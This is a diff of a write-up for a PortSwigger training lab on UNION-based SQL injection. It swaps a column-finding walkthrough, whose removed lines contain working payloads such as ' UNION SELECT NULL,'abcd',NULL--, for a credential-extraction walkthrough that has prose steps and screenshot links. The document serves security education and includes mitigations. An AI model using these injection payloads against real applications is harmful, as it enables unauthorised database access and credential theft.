@@ -1,4 +1,4 @@
-# SQL Injection UNION Attack – Finding a Column Containing Text
+# SQL Injection UNION Attack – Retrieving Data from Other Tables
 
 ## Lab Information
 
@@ -6,256 +6,136 @@
 |-------|-------|
 | Platform | PortSwigger Web Security Academy |
 | Category | SQL Injection |
-| Technique | UNION-based SQL Injection |
+| Technique | UNION-Based SQL Injection |
 | Difficulty | Apprentice |
 | Status | ✅ Solved |
 
 ---
 
-## Overview
-
-This lab demonstrates how to identify which column in a SQL query is capable of displaying string (text) data during a UNION-based SQL injection attack.
-
-After determining the total number of columns, the next objective is to discover which column accepts text values. Once identified, the provided target string is injected into the correct column to successfully complete the lab.
-
----
-
 ## Objective
 
-- Determine the number of columns returned by the original query.
-- Identify the column capable of displaying text.
-- Inject the provided string into the correct column.
-- Successfully solve the lab.
+Use a UNION-based SQL injection to retrieve sensitive information from another database table (`users`) and obtain the administrator credentials.
 
 ---
 
-## Environment
+## Lab Scenario
 
-- PortSwigger Web Security Academy
-- Burp Suite Professional
-- Burp Repeater
-- Firefox
+The application is vulnerable to SQL injection through the product category parameter.
+
+By exploiting the vulnerability with a UNION SELECT statement, it is possible to query the hidden `users` table and retrieve usernames and passwords stored in the database.
 
 ---
 
 ## Methodology
 
-### Step 1 — Intercept the Request
+### Step A – Capture the Request
 
-Capture the vulnerable request using Burp Suite Proxy and send it to Repeater.
+Capture the vulnerable request using Burp Suite.
 
-Example request:
+**Screenshot**
 
-```http
-GET /filter?category=Gifts HTTP/2
-```
+![](screenshots/01-intercept-request.png)
 
 ---
 
-### Step 2 — Determine the Number of Columns
+### Step B – Determine the Number of Columns
 
-Test different UNION SELECT statements until the response is successful.
+Identify the number of columns returned by the original query.
 
-Successful payload:
+**Screenshot**
 
-```sql
-' UNION SELECT NULL,NULL,NULL--
-```
-
-Result:
-
-- Total columns identified: **3**
+![](screenshots/02-determine-columns.png)
 
 ---
 
-### Step 3 — Identify the Text Column
+### Step C – Verify UNION Compatibility
 
-Insert a test string into each column individually.
+Confirm that the UNION query executes successfully with the correct number of columns.
 
-Attempt 1
+**Screenshot**
 
-```sql
-' UNION SELECT 'abcd',NULL,NULL--
-```
-
-Response:
-
-```
-HTTP 500 Internal Server Error
-```
+![](screenshots/03-union-compatible-columns.png)
 
 ---
 
-Attempt 2
+### Step D – Identify the Users Table
 
-```sql
-' UNION SELECT NULL,'abcd',NULL--
-```
+Retrieve or identify the hidden `users` table that contains account information.
 
-Response:
+**Screenshot**
 
-```
-HTTP 200 OK
-```
-
-The string appeared in the application's response.
-
-Result:
-
-✅ Second column accepts text.
+![](screenshots/04-users-table.png)
 
 ---
 
-### Step 4 — Retrieve the Target String
+### Step E – Identify Username and Password Columns
 
-The lab provided the following string:
+Determine which columns contain usernames and passwords.
 
-```
-YUz0R9
-```
+**Screenshot**
 
-Inject the value into the identified text column.
-
-Payload:
-
-```sql
-' UNION SELECT NULL,'YUz0R9',NULL--
-```
+![](screenshots/05-users-columns.png)
 
 ---
 
-### Step 5 — Verify the Result
+### Step F – Retrieve Administrator Credentials
 
-The application accepted the payload and marked the lab as solved.
+Extract the administrator username and password using a UNION SELECT statement.
 
-Result:
+**Screenshot**
 
-✅ Lab Solved Successfully
+![](screenshots/06-retrieve-credentials.png)
+
+---
+
+### Step G – Login as Administrator
+
+Use the retrieved administrator credentials to authenticate successfully.
+
+**Screenshot**
+
+![](screenshots/07-admin-login.png)
+
+---
+
+### Step H – Lab Solved
+
+After successful authentication, the lab is marked as solved.
+
+**Screenshot**
+
+![](screenshots/08-lab-solved.png)
 
 ---
 
 ## Payloads Used
 
-Determine columns
+See:
 
-```sql
-' UNION SELECT NULL,NULL,NULL--
 ```
-
-Test first column
-
-```sql
-' UNION SELECT 'abcd',NULL,NULL--
-```
-
-Test second column
-
-```sql
-' UNION SELECT NULL,'abcd',NULL--
-```
-
-Final payload
-
-```sql
-' UNION SELECT NULL,'YUz0R9',NULL--
+payloads.txt
 ```
 
 ---
 
-## Findings
+## Skills Practiced
 
-| Observation | Result |
-|------------|--------|
-| Number of columns | 3 |
-| Text-supported column | 2 |
-| Final payload | Successful |
-| Lab status | Solved |
-
----
-
-## Screenshots
-
-### Step 1 — Proxy HTTP History
-
-![](screenshots/01-proxy-http-history.png)
-
----
-
-### Step 2 — Original Response
-
-![](screenshots/02-original-response.png)
-
----
-
-### Step 3 — Invalid Payload
-
-![](screenshots/03-invalid-payload.png)
-
----
-
-### Step 4 — Valid Text Column
-
-![](screenshots/04-valid-text-column.png)
-
----
-
-### Step 5 — Final Payload
-
-![](screenshots/05-final-payload.png)
-
----
-
-### Step 6 — Lab Solved
-
-![](screenshots/06-lab-solved.png)
-
----
-
-## Security Impact
-
-If exploited, UNION-based SQL Injection may allow an attacker to:
-
-- Read sensitive database information
-- Extract usernames and passwords
-- Enumerate database structure
-- Access confidential business data
-- Bypass intended application logic
-
----
-
-## Mitigation
-
-- Use parameterized queries (prepared statements)
-- Avoid dynamic SQL construction
-- Validate and sanitize user input
-- Apply least-privilege database permissions
-- Implement secure error handling
-- Deploy a Web Application Firewall (WAF)
-- Conduct regular security assessments
-
----
-
-## Skills Demonstrated
-
-- SQL Injection Testing
-- UNION-based Injection
-- Column Enumeration
-- Data Type Identification
+- UNION-Based SQL Injection
+- Determining column count
+- UNION SELECT exploitation
+- Database enumeration
+- Table enumeration
+- Column enumeration
+- Credential extraction
+- Authentication using extracted credentials
 - Burp Suite Repeater
-- HTTP Request Analysis
-- Secure Documentation
+- PortSwigger Web Security Academy Labs
 
 ---
 
-## References
+## Key Takeaways
 
-- PortSwigger Web Security Academy
-- OWASP SQL Injection Prevention Cheat Sheet
-- OWASP Web Security Testing Guide
-- CWE-89: SQL Injection
-
----
-
-## Disclaimer
-
-This assessment was conducted exclusively within the PortSwigger Web Security Academy laboratory environment for educational purposes. All testing was performed on authorized systems.
+- UNION attacks allow data extraction from arbitrary tables.
+- Correct column count and compatible data types are required.
+- Sensitive information such as usernames and passwords can be exposed through insecure SQL queries.
+- Proper input validation and parameterized queries are essential to prevent SQL injection.
